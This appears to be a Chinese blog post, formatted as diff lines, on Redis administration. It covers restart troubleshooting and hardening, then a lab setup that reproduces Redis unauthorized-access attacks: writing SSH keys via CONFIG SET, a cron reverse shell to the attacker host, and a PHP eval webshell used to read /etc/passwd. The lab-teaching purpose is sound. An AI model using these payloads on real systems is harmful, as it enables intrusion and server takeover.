+<p>&emsp;&emsp;这里遇到了一些问题，就在备份进行恢复的时候是失败了的，后来我使用set命令并进行了一系列的操作都没有成功，我也删除了对应的test数据，并修改了配置文件，将密码修改为4399，但是当我重启虚拟机后，对应的redis.conf文件被读取了，恢复也成功了，能够重新的get到了对应的test数据，因此这里有些疑惑，猜测是由于前面编译安装的设置出现了问题，systemctl的对应路径有问题，回头再思考下</p>
+<center><img src="/img/Linux运维——Redis/19.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;回顾了前面的编译安装，似乎并没有问题，查看另一个shell脚本进行检验，接下来先检验下是否restart是否有问题，我这里实现查看对应的端口</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -ef|<span class="hljs-keyword">grep</span> redis<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/20.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;杀死这个端口，然后进行start操作：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill <span class="hljs-number">4873</span><br>vim <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>etc/redis.conf  <span class="hljs-comment">#修改了密码查看是否有对应更新</span><br>ps -ef|grep redis<br>systemctl status redis<br>systemctl stop redis   <span class="hljs-comment">#杀死后还是显示活跃状态</span><br>systemctl start redis<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/21.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<center><img src="/img/Linux运维——Redis/22.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<center><img src="/img/Linux运维——Redis/23.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;密码也是从4399修改为了43999，最后一张图也就是从43999再改回4399的尝试，确实证明了服务开启的时候，使用restart并没有加载修改的conf内容，但是当kill了对应的端口再执行start又能够加载到对应的内容了，这里我局的应该是我copy的一个shell脚本是有问题的，他的启动服务器的错误的（虽然我每日看出来是哪里的问题）通过检验也确实证明了是由于restart执行部加载配置文件的新内容导致的最终问题</p>
+<p>&emsp;</p>
+<h4 id="6-安全配置问题"><a href="#6-安全配置问题" class="headerlink" title="6.安全配置问题"></a>6.安全配置问题</h4><p>&emsp;&emsp;为了增强Redis的安全性，我们可以采取以下一些常见的安全配置措施</p>
+<ul>
+<li><h5 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h5></li>
+</ul>
+<p>&emsp;&emsp;通过在Redis配置文件中设置bind选项，限制Redis只能绑定到特定的IP地址。您可以将其设置为127.0.0.1以仅允许本地访问，或者指定其他特定的IP地址。此外，还可以使用requirepass选项设置密码来保护Redis服务器（就是有点麻烦，如果那个有效时间设置短了的话，会失效，需要重新输代码）</p>
+<p>&emsp;&emsp;访问控制指令：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bind</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/24.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;设置密码指令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">requirepass</span> <span class="hljs-number">4399</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/25.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h5></li>
+</ul>
+<p>&emsp;&emsp;使用防火墙软件（如iptables）来限制对Redis端口的访问。只允许来自受信任的IP地址或网络的连接请求</p>
+<p>&emsp;&emsp;使用iptables允许特定IP地址或网络的连接请求：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp -s trusted_ip_address -m tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">6379</span> -j ACCEPT<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h5 id="禁用危险命令"><a href="#禁用危险命令" class="headerlink" title="禁用危险命令"></a>禁用危险命令</h5></li>
+</ul>
+<p>&emsp;&emsp;Redis提供了一些危险的命令（如FLUSHALL和CONFIG命令），可能会导致数据丢失或服务器被攻击。可以通过修改Redis配置文件中的rename-command选项，将这些危险命令重命名或禁用</p>
+<p>&emsp;&emsp;将FLUSHALL命令重命名为DISABLED_FLUSHALL：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">FLUSHALL</span> <span class="hljs-title">DISABLED_FLUSHALL</span><br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;禁用CONFIG命令：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/26.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h5></li>
+</ul>
+<p>&emsp;&emsp;启用Redis的日志记录功能，并定期检查日志文件以监视潜在的安全问题</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">logfile <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/redis/</span>redis.log<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/27.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<h4 id="7-版本6靶场搭建"><a href="#7-版本6靶场搭建" class="headerlink" title="7.版本6靶场搭建"></a>7.版本6靶场搭建</h4><p>首先安装redis，因为前面演示的是4.0版本你，这里跟随文章使用更加新的版本进行下载安装</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://download.redis.io/releases/redis-<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">tar</span> xzf redis-<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>.tar.gz<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">make</span>  //编译成功即是redis成功安装<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/28.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>接下来启动redis进行验证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> src<br>./redis-server<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/29.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>然后去除ip绑定，首先找到redis的配置文件redis.conf，去除ip绑定，这样子能够允许除本地外的主机远程邓丽redis服务进行操作：</p>
+<center><img src="/img/Linux运维——Redis/30.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>用/进行定位，找到并在bind 127.0.0.1 前面加个注释符 #</p>
+<center><img src="/img/Linux运维——Redis/31.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>这里需要关闭报货模式，允许远程连接，与ip绑定是一个道理：</p>
+<center><img src="/img/Linux运维——Redis/32.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>用/进行定位，找到并将protested-mode的yes改为no</p>
+<center><img src="/img/Linux运维——Redis/33.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>接下来重启服务，这里要注意在重启的时候要指定redis.conf这样redis.conf才可以生效</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/redis-server /</span>root<span class="hljs-regexp">/redis-6.2.5/</span>redis.conf<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/34.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>之后使用status查看，如果为开启状态则使用stop进行关闭</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran">systemctl <span class="hljs-keyword">status</span> firewalld.service<br>systemctl <span class="hljs-keyword">stop</span> firewalld.service<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/35.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<h4 id="8-漏洞复现举例"><a href="#8-漏洞复现举例" class="headerlink" title="8.漏洞复现举例"></a>8.漏洞复现举例</h4><p>&emsp;&emsp;这里使用两个虚拟机，目标靶机为centos7的系统，攻击主机位最新的20232版本kali</p>
+<center><img src="/img/Linux运维——Redis/36.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<center><img src="/img/Linux运维——Redis/37.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">目标靶机<span class="hljs-built_in">ip</span>：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">70</span>.<span class="hljs-number">180</span><br>攻击主机<span class="hljs-built_in">ip</span>：<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">70</span>.<span class="hljs-number">172</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h5 id="进行端口扫描测试"><a href="#进行端口扫描测试" class="headerlink" title="进行端口扫描测试"></a>进行端口扫描测试</h5></li>
+</ul>
+<p>&emsp;&emsp;使用namp进行扫描，-p指定6379端口，-sS 是 nmap 命令的一个选项。-sS 选项代表 “TCP SYN 扫描”，它是一种端口扫描技术。这种扫描会向目标主机发送 TCP SYN 数据包，并分析响应来确定哪些端口是开放的</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">namp</span> –Ss <span class="hljs-number">192.168.70.180</span> -p <span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/38.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;前者是没开启redis服务的时候进行扫描动作，后者则是开启了redis服务后进行的相关扫描</p>
+<ul>
+<li><h5 id="进行客户端连接测试"><a href="#进行客户端连接测试" class="headerlink" title="进行客户端连接测试"></a>进行客户端连接测试</h5></li>
+</ul>
+<p>&emsp;&emsp;首先这里也在攻击主机kali上下载redis服务，用于连接远程的客户目标靶机，安装流程一致</p>
+<center><img src="/img/Linux运维——Redis/39.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;接下来利用redis-cli进行目标靶机的redis服务连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/redis-6.2.5/src<br>./redis-server  <span class="hljs-comment">#需要开启服务先</span><br>./redis-cli -h 192.168.70.180<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/40.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;使用 redis 客户端连接测试，发现存在未授权访问的漏洞（肯定的，目标靶机啥都关了），接下来就是利用 redis 未授权访问漏洞 getshell 了</p>
+<ul>
+<li><h5 id="公私钥认证getshell"><a href="#公私钥认证getshell" class="headerlink" title="公私钥认证getshell"></a>公私钥认证getshell</h5></li>
+</ul>
+<h6 id="1）检验前提条件"><a href="#1）检验前提条件" class="headerlink" title="1）检验前提条件"></a>1）检验前提条件</h6><p>&emsp;&emsp;首先在进行公私钥认证攻击前，我们需要确保redis服务使用root账号启动，并且服务器开放了ssh服务允许使用密钥登录，这里检验root账户启动：</p>
+<center><img src="/img/Linux运维——Redis/41.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;其次是ssh是否开放：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ps –ef|<span class="hljs-keyword">grep</span> ssh<br><span class="hljs-keyword">find</span> / -name sshd_config<br>vim  <span class="hljs-regexp">/etc/</span>ssh/sshd_config<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/42.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<center><img src="/img/Linux运维——Redis/43.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<h6 id="2）生成使用密钥"><a href="#2）生成使用密钥" class="headerlink" title="2）生成使用密钥"></a>2）生成使用密钥</h6><p>&emsp;&emsp;验证完毕，接下来使用kali攻击机执行生成密钥命令：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/44.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;运行ssh-keygen命令时，它会要求你提供一个文件名来保存密钥，默认情况下是/root/.ssh/id_rsa。如果想将密钥保存到不同的位置，可以输入想要的文件名。</p>
+<p>&emsp;&emsp;接下来，它会要求设置一个密码短语（passphrase）。密码短语是用于保护私钥的额外层安全性。如果不想设置密码短语，可以直接按回车键跳过。但请注意，设置密码短语可以增加私钥的安全性，因为即使私钥被盗，没有密码短语，攻击者也无法使用它。最后，它会再次要求确认密码短语。请确保两次输入的密码短语相同即可，这里是使用的密码短语是lhy，好咧这里就设置完</p>
+<h6 id="3）查看-ssh-文件"><a href="#3）查看-ssh-文件" class="headerlink" title="3）查看.ssh 文件"></a>3）查看.ssh 文件</h6><p>&emsp;&emsp;这里使用命令查看是否存在root/.ssh文件，并将备份文件进行了名字修改，生成对应的keys连接文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config <span class="hljs-built_in">set</span> dir /root/.ssh<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br>save<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/45.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;昨天的reids数据备份和恢复中也有相关指令的介绍和认识，这里的config set dbfilename authorized_keys就是将原本你默认的存储文件修改成了存放密钥的文件名字，这样子就能够后面使用公钥写入并ssh连接了</p>
+<h6 id="4）写入公钥"><a href="#4）写入公钥" class="headerlink" title="4）写入公钥"></a>4）写入公钥</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> .ssh/ <br><span class="hljs-comment">#将生成的公钥保存到redistest.txt</span><br> (<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; redistest.txt <br><span class="hljs-comment">#将保存ssh公钥的redistext.txt写入redis</span><br><span class="hljs-built_in">cat</span> redistest.txt | redis-cli -h 192.168.70.180 -x <span class="hljs-built_in">set</span> redistest <br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/46.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;这里保存后，需要进行save操作，保存相关的文件，我这里犯傻；了，忘记使用save进行备份，一直在排错（我是傻呗），save之后，目标靶机的对应authorized_key就会有密钥内容了</p>
+<center><img src="/img/Linux运维——Redis/47.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<center><img src="/img/Linux运维——Redis/48.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<h6 id="5）密钥连接"><a href="#5）密钥连接" class="headerlink" title="5）密钥连接"></a>5）密钥连接</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.70.180<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/49.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h5></li>
+</ul>
+<p>&emsp;&emsp;前提依旧是redis需要以root身份运行</p>
+<h6 id="1）监听端口"><a href="#1）监听端口" class="headerlink" title="1）监听端口"></a>1）监听端口</h6><p>&emsp;&emsp;在kali开启nc监听端口6666</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> –nvlp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/50.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;这里使用nc命令来创建一个监听器，等待其他计算机通过网络连接到该端口。-n选项表示禁用DNS解析，-v选项表示启用详细输出，-l选项表示监听模式，-p选项指定要监听的端口号</p>
+<h6 id="2）连接redis后写入shell"><a href="#2）连接redis后写入shell" class="headerlink" title="2）连接redis后写入shell"></a>2）连接redis后写入shell</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">redis-cli -h 192.168.70.180<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /var/spool/cron<br><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.70.172/6666 0&gt;&amp;1\n&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>
+
+<h6 id="3）kali监听反弹shell"><a href="#3）kali监听反弹shell" class="headerlink" title="3）kali监听反弹shell"></a>3）kali监听反弹shell</h6><center><img src="/img/Linux运维——Redis/51.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h5></li>
+</ul>
+<p>&emsp;&emsp;前提是服务器存在WEB网站，且知道绝对路径，比如：</p>
+<center><img src="/img/Linux运维——Redis/52.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;使用了之前搭建的lnmp系统，这里查看nginx的conf文件查看根目录在哪即可：</p>
+<center><img src="/img/Linux运维——Redis/53.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;获取到了根目录之后，接下来进行相关的一句代码写入</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /usr/share/nginx/html/</span><br><span class="language-xml">config set dbfilename redis.php</span><br><span class="language-xml">set shell &quot; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;x&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/54.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<center><img src="/img/Linux运维——Redis/55.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;成功 getshell ，是普通用户权限，接下来可以进一步提权即可，这里用到了一个hackbar工具，是火狐扩展的黑客工具，使用即可：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#获取密码</span><br><span class="hljs-attr">x</span>=system(<span class="hljs-string">&#x27;cat /etc/passwd&#x27;</span>)<span class="hljs-comment">;   </span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/56.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">x</span>=system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Redis/57.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;至此，redis的入侵模拟结束</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux%E8%BF%90%E7%BB%B4/" class="category-chain-item">Linux运维</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Redis</div>
+      <div>https://one-null-pointer.github.io/2023/06/05/Linux运维——Redis/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>liaoyue</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 5, 2023</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>传送口</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="点击进行传送">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/07/Linux%E8%BF%90%E7%BB%B4%E2%80%94%E2%80%94PHP/" title="PHP">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/04/Mysql%EF%BC%88%E4%BA%8C%EF%BC%89/" title="Mysql（二）">
+                        <span class="hidden-mobile">Mysql（二）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/" target="_blank" rel="nofollow noopener"><span>pointer</span></a> <i class="iconfont icon-love"></i> <a href="https://mp.weixin.qq.com/s/6ncLUtaiJ9j_sMjZT5z-2w" target="_blank" rel="nofollow noopener"><span>一个爱学习的空指针</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
